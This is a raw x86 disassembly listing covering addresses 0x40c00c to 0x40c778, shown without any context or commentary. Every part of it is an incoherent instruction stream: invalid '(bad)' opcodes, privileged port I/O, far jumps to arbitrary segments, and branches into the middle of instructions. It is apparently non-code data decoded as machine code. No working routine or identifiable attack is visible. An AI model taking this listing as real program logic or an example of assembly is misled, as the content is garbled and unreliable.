  40c00c:	and    DWORD PTR [edx+0x2e],ecx
  40c00f:	pop    es
  40c010:	jl     0x40c056
  40c012:	xor    al,0xfb
  40c014:	xchg   BYTE PTR [ebp+0x69],al
  40c017:	pop    ebx
  40c018:	mov    al,0x7d
  40c01a:	ins    DWORD PTR es:[edi],dx
  40c01b:	inc    ecx
  40c01c:	push   edi
  40c01d:	cmp    edx,DWORD PTR [eax-0x70ba4852]
  40c023:	or     dh,ah
  40c025:	adc    edx,DWORD PTR [ecx-0x50]
  40c028:	pop    ds
  40c029:	fldz   
  40c02b:	repnz aas 
  40c02d:	cmp    dh,BYTE PTR [ebp-0x49]
  40c030:	lea    esp,[ecx-0x2371d0be]
  40c036:	out    dx,al
  40c037:	adc    eax,0xf16cfe5
  40c03c:	add    al,bh
  40c03e:	add    BYTE PTR [edi-0xd1f20d8],al
  40c044:	push   ds
  40c045:	fild   QWORD PTR [ecx+0x2b]
  40c048:	mov    dh,0xd8
  40c04a:	inc    edi
  40c04b:	out    0x2c,eax
  40c04d:	jg     0x40c00b
  40c04f:	call   0xa4f4:0x7636c9a8
  40c056:	test   cl,bl
  40c058:	js     0x40c07c
  40c05a:	lds    edx,FWORD PTR [edx]
  40c05c:	push   ecx
  40c05d:	cmc    
  40c05e:	inc    ebx
  40c05f:	dec    esp
  40c060:	or     al,0x1c
  40c062:	in     eax,dx
  40c063:	sbb    bh,bh
  40c065:	bound  ebp,QWORD PTR [eax+ebp*4]
  40c068:	ret    
  40c069:	xchg   esi,eax
  40c06a:	outs   dx,BYTE PTR ds:[esi]
  40c06b:	popa   
  40c06c:	sub    DWORD PTR [ebp+0x1c6376ab],0xecf99974
  40c076:	mov    ebp,0x86f8d98c
  40c07b:	add    bl,BYTE PTR [edi]
  40c07d:	sbb    eax,0xf2963de
  40c082:	jp     0x40c0fc
  40c084:	pop    ecx
  40c085:	std    
  40c086:	jmp    0x3597ccc9
  40c08b:	iret   
  40c08c:	cmp    eax,0x2b089c01
  40c091:	into   
  40c092:	adc    eax,0xb5b2b723
  40c097:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c098:	xchg   DWORD PTR [ebx+0x49],esi
  40c09b:	aad    0x14
  40c09d:	int    0x7e
  40c09f:	leave  
  40c0a0:	xlat   BYTE PTR ds:[ebx]
  40c0a1:	pop    DWORD PTR [eax+0x1c31a03a]
  40c0a7:	or     DWORD PTR [ebx+esi*8+0x4fed1bc0],0x74
  40c0af:	sbb    al,0x6d
  40c0b1:	mov    ah,0x74
  40c0b3:	jl     0x40c0ed
  40c0b5:	test   DWORD PTR [ebx],0xb23aa9e9
  40c0bb:	push   esp
  40c0bc:	mov    ecx,0xd4d26028
  40c0c1:	lods   eax,DWORD PTR ds:[esi]
  40c0c2:	loopne 0x40c112
  40c0c4:	push   ebx
  40c0c5:	pop    edx
  40c0c6:	je     0x40c099
  40c0c8:	dec    ecx
  40c0c9:	xchg   esi,eax
  40c0ca:	hlt    
  40c0cb:	in     al,dx
  40c0cc:	jp     0x40c050
  40c0ce:	mov    ecx,0x891c91d2
  40c0d3:	ins    BYTE PTR es:[edi],dx
  40c0d4:	mov    eax,0x91130d9e
  40c0d9:	jmp    DWORD PTR [edx-0x4c]
  40c0dc:	dec    esi
  40c0dd:	dec    esp
  40c0de:	clc    
  40c0df:	call   0x48528d15
  40c0e4:	(bad)  
  40c0e5:	jecxz  0x40c0b3
  40c0e7:	sub    bl,BYTE PTR [edi-0x75de2c95]
  40c0ed:	lahf   
  40c0ee:	push   ecx
  40c0ef:	push   ebp
  40c0f0:	pop    edx
  40c0f1:	dec    ebp
  40c0f2:	mov    eax,ss:0xc9b8e110
  40c0f8:	add    eax,0xaa1763d6
  40c0fd:	pop    ebp
  40c0fe:	inc    esp
  40c0ff:	test   BYTE PTR [eax+0x4e010720],0x6f
  40c106:	or     BYTE PTR ds:0xd523441d,dl
  40c10c:	(bad)  
  40c10d:	jecxz  0x40c0c7
  40c10f:	ret    
  40c110:	(bad)  
  40c111:	and    eax,0x4cdc4cd3
  40c116:	std    
  40c117:	or     BYTE PTR [edx+0x9661348],cl
  40c11d:	les    ebx,FWORD PTR fs:[edi+0x1a]
  40c121:	imul   edi,esi,0xd46281ce
  40c127:	aas    
  40c128:	xor    BYTE PTR [ebx],dl
  40c12a:	neg    BYTE PTR [ebp+0x45ddae55]
  40c130:	jne    0x40c124
  40c132:	lahf   
  40c133:	fistp  QWORD PTR [ebx-0x243aac69]
  40c139:	mov    ebx,0x4ff5de5c
  40c13e:	and    eax,0xf384ef1e
  40c143:	aas    
  40c144:	cli    
  40c145:	scas   eax,DWORD PTR es:[edi]
  40c146:	(bad)  
  40c148:	outs   dx,DWORD PTR ds:[esi]
  40c149:	mov    esp,0x6941040c
  40c14e:	or     ah,BYTE PTR [ecx]
  40c150:	popf   
  40c151:	out    dx,al
  40c152:	daa    
  40c153:	and    DWORD PTR [esi+0x2a],ecx
  40c156:	repz dec ecx
  40c158:	or     DWORD PTR [eax-0x4d431498],eax
  40c15e:	scas   al,BYTE PTR es:[edi]
  40c15f:	loopne 0x40c160
  40c161:	in     al,0xde
  40c163:	or     BYTE PTR [ebx],bh
  40c165:	push   ecx
  40c166:	and    al,BYTE PTR [edi+ebp*4]
  40c169:	push   esp
  40c16a:	mov    dl,0xd5
  40c16c:	xchg   ch,ch
  40c16e:	repz or bh,BYTE PTR [edx-0x47]
  40c172:	pushf  
  40c173:	mov    ebp,0x1288f9a0
  40c178:	xor    al,0x6e
  40c17a:	add    eax,0x280e476c
  40c17f:	pusha  
  40c180:	cs std 
  40c182:	(bad)  
  40c183:	fucomi st,st(1)
  40c185:	mov    al,0x93
  40c187:	sbb    al,0x15
  40c189:	aam    0xba
  40c18b:	xchg   ecx,eax
  40c18c:	cs xchg ebx,eax
  40c18e:	push   eax
  40c18f:	pusha  
  40c190:	test   BYTE PTR [ecx-0x2666aa8a],cl
  40c196:	sub    al,0xb9
  40c198:	inc    ecx
  40c199:	pop    ss
  40c19a:	loope  0x40c133
  40c19c:	cs jns 0x40c171
  40c19f:	cmp    ah,BYTE PTR [ecx+0x33b3fdb8]
  40c1a5:	sub    DWORD PTR [edx],esi
  40c1a7:	outs   dx,BYTE PTR ds:[esi]
  40c1a8:	cmp    BYTE PTR [edx+ebx*2],ch
  40c1ab:	retf   
  40c1ac:	frstor [ecx-0x132c1d37]
  40c1b2:	jecxz  0x40c20c
  40c1b4:	lahf   
  40c1b5:	push   es
  40c1b6:	addr16 loopne 0x40c192
  40c1b9:	rcpps  xmm1,xmm5
  40c1bc:	ins    BYTE PTR es:[edi],dx
  40c1bd:	sahf   
  40c1be:	out    0xea,eax
  40c1c0:	jae    0x40c1d3
  40c1c2:	sub    eax,0xce4b6895
  40c1c7:	cmp    BYTE PTR [edx-0x8b712df],cl
  40c1cd:	out    dx,al
  40c1ce:	addr16 std 
  40c1d0:	mov    edi,0x40557ca9
  40c1d5:	arpl   WORD PTR [ecx*4+0x2894847a],cx
  40c1dc:	aas    
  40c1dd:	mov    ds:0xd2b5c50b,eax
  40c1e2:	test   al,0xf5
  40c1e4:	push   ebx
  40c1e5:	or     DWORD PTR [ecx-0x34],edx
  40c1e8:	std    
  40c1e9:	int3   
  40c1ea:	push   ds
  40c1eb:	jns    0x40c1fb
  40c1ed:	dec    esp
  40c1ee:	adc    dl,dh
  40c1f0:	jmp    0x667b8fc2
  40c1f5:	xor    esi,DWORD PTR [edi+0x7d16a1ba]
  40c1fb:	and    BYTE PTR [edx],cl
  40c1fd:	or     BYTE PTR [eax-0x3b],dl
  40c200:	fs leave 
  40c202:	xchg   edx,eax
  40c203:	and    DWORD PTR [ebx+0x2],esp
  40c206:	out    0xf5,eax
  40c208:	cmp    bl,dh
  40c20a:	mov    esp,edi
  40c20c:	inc    esi
  40c20d:	mov    fs,ebx
  40c20f:	cvtps2pd xmm7,QWORD PTR ds:0x78880b93
  40c216:	push   0xfffffff0
  40c218:	out    dx,eax
  40c219:	in     al,dx
  40c21a:	xchg   edi,eax
  40c21b:	(bad)  
  40c21c:	jmp    0x5332:0xdbb5ff4
  40c223:	pop    ss
  40c224:	cmp    DWORD PTR [ecx],esp
  40c226:	sbb    cl,BYTE PTR [eax-0x25]
  40c229:	jae    0x40c21e
  40c22b:	mov    eax,0x27b52bca
  40c230:	xchg   edx,eax
  40c231:	xchg   edx,eax
  40c232:	sbb    bl,BYTE PTR [edx+0x4d]
  40c235:	pop    ds
  40c236:	mov    ebx,0xe0135847
  40c23b:	xchg   edi,eax
  40c23c:	ja     0x40c256
  40c23e:	fisubr DWORD PTR [ecx+ecx*1]
  40c241:	scas   eax,DWORD PTR es:[edi]
  40c242:	pop    edx
  40c243:	inc    ebx
  40c244:	sbb    eax,DWORD PTR [edx+0x64]
  40c247:	jb     0x40c2be
  40c249:	jmp    0x6d8607bb
  40c24e:	and    eax,0xfdf70ba7
  40c253:	and    bh,dl
  40c255:	ja     0x40c21c
  40c257:	add    DWORD PTR [ecx+0x2a],esp
  40c25a:	xchg   DWORD PTR [ecx+eiz*2],eax
  40c25d:	mov    ebp,0x3dfb14b4
  40c262:	in     al,0xfd
  40c264:	mov    eax,0x1f2a88f2
  40c269:	aaa    
  40c26a:	mov    BYTE PTR cs:[edx-0x3d],dh
  40c26e:	or     eax,0xa29a1bfb
  40c273:	cmp    DWORD PTR ds:0x72484154,ebx
  40c279:	sbb    eax,DWORD PTR [esp+ebp*4+0x35]
  40c27d:	test   BYTE PTR [ecx+ebp*8+0x73a2b084],0x6c
  40c285:	ds ins DWORD PTR es:[edi],dx
  40c287:	add    al,0xe4
  40c289:	xchg   edi,eax
  40c28a:	lea    ebx,[edi+0x27]
  40c28d:	jnp    0x40c2ba
  40c28f:	push   0x2e
  40c291:	cmc    
  40c292:	clc    
  40c293:	fcmovb st,st(7)
  40c295:	pop    edi
  40c296:	mov    ch,0x1e
  40c298:	xor    BYTE PTR [edx-0x16],bl
  40c29b:	jns    0x40c247
  40c29d:	pop    ecx
  40c29e:	idiv   DWORD PTR [ebx]
  40c2a0:	scas   al,BYTE PTR es:[edi]
  40c2a1:	fcomi  st,st(1)
  40c2a3:	lods   eax,DWORD PTR ds:[esi]
  40c2a4:	mov    eax,0xf568c5af
  40c2a9:	js     0x40c2bd
  40c2ab:	or     eax,0xea659082
  40c2b0:	add    DWORD PTR [esi-0x67],0x93c8e91f
  40c2b7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c2b8:	mov    ebx,0xc4de3c07
  40c2bd:	out    dx,al
  40c2be:	ins    BYTE PTR es:[edi],dx
  40c2bf:	ret    0x765b
  40c2c2:	mov    cl,0x34
  40c2c4:	dec    ebx
  40c2c5:	mov    bl,0x99
  40c2c7:	or     ebp,DWORD PTR [esi+0x8db836a]
  40c2cd:	cwde   
  40c2ce:	xor    esp,esp
  40c2d0:	pop    esp
  40c2d1:	(bad)  
  40c2d2:	mov    edi,0x7423befa
  40c2d7:	jo     0x40c346
  40c2d9:	mov    ebx,0x9b2da5b8
  40c2de:	adc    al,0xa
  40c2e0:	inc    ebx
  40c2e1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c2e2:	push   ecx
  40c2e3:	test   eax,0x8fb006b4
  40c2e8:	xor    DWORD PTR [eax],esi
  40c2ea:	add    ch,BYTE PTR [ebx]
  40c2ec:	test   BYTE PTR [esi+esi*1+0x276a24f6],ah
  40c2f3:	add    BYTE PTR [ebx],ah
  40c2f5:	adc    al,BYTE PTR [edx+ecx*4-0xb68b1a9]
  40c2fc:	adc    eax,0xd5ebceed
  40c301:	pop    ebp
  40c302:	in     al,0x6b
  40c304:	das    
  40c305:	xor    edi,DWORD PTR [eax]
  40c307:	add    dl,al
  40c309:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c30a:	lahf   
  40c30b:	cmp    DWORD PTR [edi+0x2a8444fc],ecx
  40c311:	mov    esp,0xe3c8af17
  40c316:	inc    ebx
  40c317:	dec    ecx
  40c318:	lods   eax,DWORD PTR ds:[esi]
  40c319:	push   ss
  40c31a:	push   cs
  40c31b:	adc    edx,DWORD PTR [edi-0x2c]
  40c31e:	into   
  40c31f:	or     eax,0xbef4bd5
  40c324:	cmc    
  40c325:	or     bl,BYTE PTR [esi-0x44]
  40c328:	or     esi,DWORD PTR [edx+0x7]
  40c32b:	clc    
  40c32c:	dec    ebp
  40c32d:	and    eax,0x9566ceb2
  40c332:	jns    0x40c391
  40c334:	sub    eax,0x19f7cf10
  40c339:	push   esi
  40c33a:	add    eax,0x6f8328af
  40c33f:	cld    
  40c340:	cmpps  xmm5,xmm3,0x28
  40c344:	ss jae 0x40c3b6
  40c347:	ins    DWORD PTR es:[edi],dx
  40c348:	outs   dx,DWORD PTR ds:[esi]
  40c349:	or     al,0xf9
  40c34b:	addr16 push esp
  40c34d:	pushf  
  40c34e:	jmp    DWORD PTR [ecx+ecx*8]
  40c351:	call   0x7fdc0a17
  40c356:	pop    eax
  40c357:	push   ds
  40c358:	lock cmp eax,0xd6f38c0f
  40c35e:	inc    eax
  40c35f:	ins    DWORD PTR es:[edi],dx
  40c360:	movups xmm4,XMMWORD PTR [ecx+0x66]
  40c364:	and    edi,DWORD PTR [eax+0x14]
  40c367:	js     0x40c394
  40c369:	cmp    BYTE PTR [ecx+ebp*4-0x63],dh
  40c36d:	mov    dl,0x51
  40c36f:	rcr    ebx,1
  40c371:	mov    ch,0x8b
  40c373:	and    DWORD PTR [esi-0x2564a00d],ecx
  40c379:	jp     0x40c308
  40c37b:	xor    bl,BYTE PTR [ebx+0x3b]
  40c37e:	and    eax,0x9030a3b4
  40c383:	in     eax,dx
  40c384:	repz loopne 0x40c368
  40c387:	stc    
  40c388:	cld    
  40c389:	mov    ah,0xb3
  40c38b:	es cs jae 0x40c33e
  40c38f:	icebp  
  40c390:	adc    ebx,DWORD PTR [ebx-0x3b842663]
  40c396:	stc    
  40c397:	daa    
  40c398:	xor    al,0x88
  40c39a:	xchg   esp,eax
  40c39b:	mov    bl,0x96
  40c39d:	cmp    al,0x1a
  40c39f:	and    ebp,ecx
  40c3a1:	ja     0x40c3ff
  40c3a3:	add    ecx,ebp
  40c3a5:	rol    DWORD PTR [edi],0xa5
  40c3a8:	icebp  
  40c3a9:	shl    BYTE PTR [esi],0xe2
  40c3ac:	or     eax,0x2e76f525
  40c3b1:	pop    edi
  40c3b2:	mov    esi,DWORD PTR [ebp-0x425b468b]
  40c3b8:	sbb    eax,0xdeb82913
  40c3bd:	ds mov esi,0x6b7f600c
  40c3c3:	xchg   esi,eax
  40c3c4:	jae    0x40c35f
  40c3c6:	xchg   ebp,eax
  40c3c7:	call   0x67fbf35d
  40c3cc:	pop    edx
  40c3cd:	sbb    eax,0x2e7a6843
  40c3d2:	jmp    0x40c3e7
  40c3d4:	add    DWORD PTR [esi+eiz*4+0x40],ebp
  40c3d8:	inc    edx
  40c3d9:	adc    DWORD PTR [edx],esp
  40c3db:	(bad)  
  40c3dc:	imul   edx,DWORD PTR [ecx+0xf43d44c],0x3a8ad378
  40c3e6:	mov    ebp,0xe49b426e
  40c3eb:	mov    cl,0x14
  40c3ed:	cmc    
  40c3ee:	es dec esp
  40c3f0:	push   0x4a276f4b
  40c3f5:	mov    eax,0x619ac62
  40c3fa:	and    esp,ebp
  40c3fc:	xchg   ebp,eax
  40c3fd:	xor    BYTE PTR [eax-0x25],al
  40c400:	sbb    BYTE PTR [edi+esi*4+0x5c],dh
  40c404:	add    DWORD PTR [esi],ebp
  40c406:	jbe    0x40c3df
  40c408:	ins    DWORD PTR es:[edi],dx
  40c409:	xor    ah,BYTE PTR [edi+0x3b0aab8e]
  40c40f:	das    
  40c410:	addr16 cld 
  40c412:	push   ebx
  40c413:	test   eax,0x2a44f56e
  40c418:	les    edi,FWORD PTR [ecx-0x241e197e]
  40c41e:	in     al,0xae
  40c420:	retf   
  40c421:	push   ebx
  40c422:	push   ecx
  40c423:	inc    ebp
  40c424:	pop    edi
  40c425:	aas    
  40c426:	mov    ?,WORD PTR [esp+ebx*1]
  40c429:	add    eax,0xda060323
  40c42e:	loopne 0x40c3c3
  40c430:	ret    0xb437
  40c433:	dec    ebp
  40c434:	xlat   BYTE PTR ds:[ebx]
  40c435:	iret   
  40c436:	imul   eax,DWORD PTR [ebx],0x384aa718
  40c43c:	pop    ebp
  40c43d:	test   BYTE PTR [esi],ch
  40c43f:	jbe    0x40c423
  40c441:	js     0x40c3ee
  40c443:	(bad)  
  40c444:	aam    0x3b
  40c446:	mov    eax,0x6febda1f
  40c44b:	push   ecx
  40c44c:	ret    
  40c44d:	inc    ebx
  40c44e:	add    DWORD PTR [bp+si+0x51],esi
  40c452:	retf   0x3d02
  40c455:	and    ch,ah
  40c457:	or     eax,0x9e2512b2
  40c45c:	add    DWORD PTR [ecx-0x2032c9be],ecx
  40c462:	loopne 0x40c4b8
  40c464:	push   es
  40c465:	inc    ebp
  40c466:	into   
  40c467:	push   0x4e
  40c469:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c46a:	mov    bl,0xb7
  40c46c:	sub    ebp,DWORD PTR [esi-0x7b]
  40c46f:	fwait
  40c470:	mov    bh,0x5f
  40c472:	xchg   esi,eax
  40c473:	pop    ecx
  40c474:	mov    ah,0xa6
  40c476:	pop    ds
  40c477:	aaa    
  40c478:	out    0x40,eax
  40c47a:	mov    ds:0x754591d5,al
  40c47f:	lods   al,BYTE PTR ds:[esi]
  40c480:	xchg   esi,eax
  40c481:	adc    eax,0xe4fc5aa5
  40c486:	dec    ebp
  40c487:	repz sub bl,BYTE PTR [ebx+0x22]
  40c48b:	pop    ds
  40c48c:	mov    ds:0x3e8a00c2,eax
  40c491:	xor    eax,0xb5a39fbd
  40c496:	push   ebx
  40c497:	std    
  40c498:	and    BYTE PTR [esi+0x6831803b],bl
  40c49e:	jge    0x40c4c1
  40c4a0:	std    
  40c4a1:	ret    
  40c4a2:	jle    0x40c43c
  40c4a4:	loopne 0x40c4de
  40c4a6:	jl     0x40c508
  40c4a8:	push   cs
  40c4a9:	dec    ebx
  40c4aa:	jge    0x40c527
  40c4ac:	adc    al,0x76
  40c4ae:	adc    al,0x28
  40c4b0:	(bad)  
  40c4b2:	(bad)  
  40c4b3:	dec    edi
  40c4b4:	fld    DWORD PTR [ebx]
  40c4b6:	test   al,0xed
  40c4b8:	mov    dl,0x11
  40c4ba:	outs   dx,BYTE PTR ds:[esi]
  40c4bb:	cmp    ebp,0x16
  40c4be:	mov    ds:0x2d10047d,al
  40c4c3:	xchg   ecx,eax
  40c4c4:	aas    
  40c4c5:	push   ebp
  40c4c6:	jmp    0x57ce:0x2907c1ba
  40c4cd:	and    eax,0x40460977
  40c4d2:	xor    al,BYTE PTR [ebx+0x6e4276d2]
  40c4d8:	(bad)  
  40c4d9:	hlt    
  40c4da:	adc    al,0x4f
  40c4dc:	stos   BYTE PTR es:[edi],al
  40c4dd:	cmp    esi,DWORD PTR [edx+0x2b828898]
  40c4e3:	dec    ebp
  40c4e4:	jns    0x40c4e7
  40c4e6:	es ins BYTE PTR es:[edi],dx
  40c4e8:	lods   eax,DWORD PTR ds:[esi]
  40c4e9:	xor    esi,DWORD PTR [esi+0x2d0ce749]
  40c4ef:	push   es
  40c4f0:	push   es
  40c4f1:	mov    dl,0x92
  40c4f3:	cwde   
  40c4f4:	dec    ebp
  40c4f5:	or     esp,esi
  40c4f7:	pop    edi
  40c4f8:	dec    esi
  40c4f9:	xchg   BYTE PTR [ecx],dh
  40c4fb:	push   esi
  40c4fc:	fimul  DWORD PTR [edi]
  40c4fe:	shl    ch,1
  40c500:	add    BYTE PTR [ebx],ch
  40c502:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c503:	push   ebp
  40c504:	mov    edx,0xc2d53fa0
  40c509:	jg     0x40c4b0
  40c50b:	mov    DWORD PTR [ecx],edx
  40c50d:	in     al,dx
  40c50e:	mov    WORD PTR [ebx+ecx*2-0x16391599],?
  40c515:	add    esi,DWORD PTR [edx-0x3065b971]
  40c51b:	xchg   BYTE PTR [ecx+0x60],dl
  40c51e:	inc    ecx
  40c51f:	fistp  WORD PTR [eax-0x22c41f58]
  40c525:	jecxz  0x40c4bd
  40c527:	clc    
  40c528:	jnp    0x40c539
  40c52a:	pop    esi
  40c52b:	leave  
  40c52c:	push   edi
  40c52d:	mov    al,0x8b
  40c52f:	push   ds
  40c530:	push   ecx
  40c531:	repnz les esp,FWORD PTR [ebp-0x4c]
  40c535:	lods   al,BYTE PTR ds:[esi]
  40c536:	pop    ebx
  40c537:	push   ecx
  40c538:	lods   eax,DWORD PTR ds:[esi]
  40c539:	mov    ecx,0xf50fec6d
  40c53e:	sbb    eax,DWORD PTR [bx-0x7a]
  40c542:	dec    esi
  40c543:	lahf   
  40c544:	mov    bl,0xbb
  40c546:	inc    esp
  40c547:	push   ss
  40c548:	mov    al,0x80
  40c54a:	(bad)  
  40c54b:	in     eax,0x8
  40c54d:	iret   
  40c54e:	pop    edi
  40c54f:	sar    DWORD PTR [edx+0x39],1
  40c552:	fbld   TBYTE PTR [ecx-0x5e]
  40c555:	push   esp
  40c556:	and    dl,dl
  40c558:	cmp    BYTE PTR [edx-0x32],ah
  40c55b:	mov    ah,0x80
  40c55d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c55e:	aaa    
  40c55f:	retf   
  40c560:	mov    WORD PTR [edx+0x27],es
  40c563:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c564:	dec    eax
  40c565:	aas    
  40c566:	mov    esi,0xa9b3c660
  40c56b:	add    BYTE PTR [esi-0x2],bh
  40c56e:	arpl   bp,dx
  40c570:	rcr    BYTE PTR [edi],1
  40c572:	xor    al,0xb7
  40c574:	push   eax
  40c575:	lahf   
  40c576:	(bad)  
  40c577:	leave  
  40c578:	rol    BYTE PTR es:[eax],cl
  40c57b:	xor    bh,BYTE PTR [ebp+0x6c7c4166]
  40c581:	mov    esi,0x111d7661
  40c586:	icebp  
  40c587:	mov    edi,0x9682f41b
  40c58c:	jg     0x40c55d
  40c58e:	jae    0x40c5eb
  40c590:	out    dx,al
  40c591:	icebp  
  40c592:	enter  0x5d50,0xda
  40c596:	rcl    ecx,0xb9
  40c599:	out    0x2f,al
  40c59b:	xchg   ebx,eax
  40c59c:	or     BYTE PTR cs:[edi+0x43],bl
  40c5a0:	sar    BYTE PTR [eax-0xc247423],cl
  40c5a6:	xor    al,0xf5
  40c5a8:	mov    dh,0xfc
  40c5aa:	sbb    ch,dl
  40c5ac:	mov    ecx,DWORD PTR [edx-0x6a]
  40c5af:	push   0xdd95c4ee
  40c5b4:	push   esp
  40c5b5:	(bad)  
  40c5b6:	scas   eax,DWORD PTR es:[edi]
  40c5b7:	lods   al,BYTE PTR ds:[esi]
  40c5b8:	ret    
  40c5b9:	loop   0x40c542
  40c5bb:	or     eax,edi
  40c5bd:	or     al,BYTE PTR [ecx+0x52d70948]
  40c5c3:	add    cl,BYTE PTR [ebx]
  40c5c5:	adc    cl,cl
  40c5c7:	fdiv   DWORD PTR [edx-0x6f]
  40c5ca:	mov    bh,0x2d
  40c5cc:	lock cmp eax,0x7246f004
  40c5d2:	fcomp  st(2)
  40c5d4:	das    
  40c5d5:	inc    ebx
  40c5d6:	mov    cl,0x61
  40c5d8:	addr16 retf 
  40c5da:	fwait
  40c5db:	or     DWORD PTR [edi+edi*8-0x31f1272b],0xffffff9a
  40c5e3:	es jl  0x40c624
  40c5e6:	inc    edx
  40c5e7:	sbb    ebp,ebx
  40c5e9:	(bad)  
  40c5ea:	ds cld 
  40c5ec:	(bad)  
  40c5ed:	sub    edx,DWORD PTR [eax+0x27]
  40c5f0:	cmp    DWORD PTR [edi],esp
  40c5f2:	adc    al,0x8a
  40c5f4:	pop    ss
  40c5f5:	push   0xa876babb
  40c5fa:	test   BYTE PTR [ecx+0x7cdad7e4],dl
  40c600:	ds mov bl,0xcd
  40c603:	add    bl,dl
  40c605:	fwait
  40c606:	and    BYTE PTR [esi+edx*4-0x3f],dh
  40c60a:	fdivrp st(2),st
  40c60c:	mov    cl,dh
  40c60e:	mov    dl,0x89
  40c610:	(bad)  
  40c611:	pop    ecx
  40c612:	addr16 add al,0xc1
  40c615:	ds jmp 0x179fbf6c
  40c61b:	hlt    
  40c61c:	jecxz  0x40c682
  40c61e:	sar    DWORD PTR [eax],cl
  40c620:	ror    bh,cl
  40c622:	mov    dh,0xb1
  40c624:	rol    DWORD PTR [esi-0x1f03a18e],0x3e
  40c62b:	or     ch,al
  40c62d:	mov    cl,BYTE PTR [ebx+0x39]
  40c630:	sti    
  40c631:	aam    0xa1
  40c633:	sahf   
  40c634:	stos   DWORD PTR es:[edi],eax
  40c635:	sub    DWORD PTR [ecx+esi*8],0x5c
  40c639:	add    al,0x65
  40c63b:	dec    esp
  40c63c:	clc    
  40c63d:	in     al,dx
  40c63e:	mov    eax,0x66f35d20
  40c643:	sti    
  40c644:	inc    esi
  40c645:	xor    eax,0x688b8d2b
  40c64a:	xor    ebp,DWORD PTR [ebx]
  40c64c:	xchg   BYTE PTR [eax],al
  40c64e:	scas   al,BYTE PTR es:[edi]
  40c64f:	ss dec esi
  40c651:	fist   WORD PTR [ebp-0x6b1a2df6]
  40c657:	jl     0x40c61d
  40c659:	adc    dh,BYTE PTR fs:[ecx-0x2b]
  40c65d:	push   ebx
  40c65e:	mov    esp,0x9cd9f5ae
  40c663:	dec    eax
  40c664:	loopne 0x40c646
  40c666:	int3   
  40c667:	adc    eax,0x1071a08
  40c66c:	hlt    
  40c66d:	ss jmp 0x64c2:0xc3fbe949
  40c675:	adc    esi,DWORD PTR [edx-0x3682bfc5]
  40c67b:	dec    esi
  40c67c:	sbb    eax,0xfb5ad244
  40c681:	dec    eax
  40c682:	inc    eax
  40c683:	(bad)  
  40c684:	pop    eax
  40c685:	lea    eax,[ecx]
  40c687:	inc    ebx
  40c688:	pusha  
  40c689:	jp     0x40c673
  40c68b:	pop    ss
  40c68c:	xlat   BYTE PTR es:[ebx]
  40c68e:	mov    dl,0x24
  40c690:	mov    cl,0x3e
  40c692:	jg     0x40c692
  40c694:	add    ecx,DWORD PTR [ebx+eax*8-0x5f]
  40c698:	cmp    al,0x4f
  40c69a:	jno    0x40c662
  40c69c:	sub    al,0xfd
  40c69e:	pop    ss
  40c69f:	pop    edx
  40c6a0:	xchg   ebx,eax
  40c6a1:	adc    ch,BYTE PTR [ebx-0x75]
  40c6a4:	add    ah,BYTE PTR [esi+eiz*1-0x630d9ea7]
  40c6ab:	xor    DWORD PTR [esi+0x37],edi
  40c6ae:	push   edi
  40c6af:	pop    ecx
  40c6b0:	sahf   
  40c6b1:	xor    DWORD PTR [ecx-0x24],esp
  40c6b4:	or     eax,0xf5320268
  40c6b9:	xchg   edi,eax
  40c6ba:	xchg   dh,al
  40c6bc:	cmp    al,0x7f
  40c6be:	in     eax,0x8f
  40c6c0:	or     eax,0xec5e19f8
  40c6c5:	jae    0x40c6a6
  40c6c7:	test   dh,ch
  40c6c9:	loop   0x40c6ec
  40c6cb:	adc    DWORD PTR [edx-0x63e15ea],esi
  40c6d1:	cwde   
  40c6d2:	jmp    edi
  40c6d4:	popa   
  40c6d5:	adc    al,BYTE PTR [edx-0x35]
  40c6d8:	push   ds
  40c6d9:	pushf  
  40c6da:	lea    ecx,[esi+0x341e1887]
  40c6e0:	sbb    bh,BYTE PTR [esi-0x69]
  40c6e3:	lods   eax,DWORD PTR ds:[esi]
  40c6e4:	rcr    DWORD PTR [edi-0x21],1
  40c6e7:	adc    DWORD PTR [ebx],edi
  40c6e9:	mov    ds:0x3c44198e,al
  40c6ee:	in     eax,dx
  40c6ef:	pop    edi
  40c6f0:	stc    
  40c6f1:	dec    edx
  40c6f2:	mov    al,ds:0x2920ec0d
  40c6f7:	jae    0x40c708
  40c6f9:	mov    al,ds:0xb6ac02f1
  40c6fe:	(bad)  
  40c700:	xchg   esp,eax
  40c701:	mov    ds:0xb5bf2e75,eax
  40c706:	xchg   ebx,eax
  40c707:	sub    ebx,DWORD PTR [esi+ecx*2-0x39ab0bdc]
  40c70e:	adc    DWORD PTR [eax-0x5dbc6aa2],esi
  40c714:	fcmovnu st,st(0)
  40c716:	(bad)  
  40c717:	ja     0x40c6cb
  40c719:	pop    esi
  40c71a:	cli    
  40c71b:	test   BYTE PTR [ebx-0x7e3ecfdd],al
  40c721:	aad    0xa9
  40c723:	mov    ds:0x53188a7e,eax
  40c728:	repz test DWORD PTR [eax],esi
  40c72b:	sub    al,0x2b
  40c72d:	push   ecx
  40c72e:	repz mov ?,WORD PTR [esi+0x12]
  40c732:	aam    0xf7
  40c734:	mov    ecx,0x742ff0
  40c739:	xor    DWORD PTR [eax+edx*1-0x27],eax
  40c73d:	jg     0x40c6c4
  40c73f:	mov    edx,0xaae6f05c
  40c744:	sub    edx,DWORD PTR [edi+0x87a0873]
  40c74a:	out    0xd6,al
  40c74c:	cmp    eax,0x8e071f3a
  40c751:	mov    ch,0x80
  40c753:	or     ebx,DWORD PTR [eax+ecx*2+0x44]
  40c757:	out    0x10,al
  40c759:	push   eax
  40c75a:	push   ecx
  40c75b:	mov    eax,0x64b7a9cc
  40c760:	pop    eax
  40c761:	cmp    al,0x2c
  40c763:	xor    BYTE PTR [ecx],bl
  40c765:	and    dh,0x24
  40c768:	xchg   BYTE PTR [edx+0x48],bl
  40c76b:	fsub   st(6),st
  40c76d:	fdivr  QWORD PTR [edx+0x78]
  40c770:	mov    dl,0x82
  40c772:	sub    bh,BYTE PTR [ebx]
  40c774:	stos   DWORD PTR es:[edi],eax
  40c775:	or     bh,0xda
  40c778:	ins    BYTE PTR es:[edi],dx
